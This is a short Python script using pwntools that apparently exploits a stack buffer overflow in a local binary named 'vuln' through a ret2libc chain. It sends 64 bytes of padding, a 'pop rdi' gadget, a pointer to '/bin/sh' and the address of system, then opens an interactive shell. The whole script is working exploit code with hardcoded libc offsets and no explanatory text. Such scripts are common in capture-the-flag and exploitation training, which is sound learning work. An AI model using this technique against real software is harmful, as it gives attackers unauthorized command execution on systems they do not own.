from pwn import *

p = process('./vuln')

libc_base = 0x7ffff7dc4000
system = libc_base + 0x4dab0
binsh = libc_base + 0x197e34

POP_RDI = 0x28215

payload = b'A' * 64         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()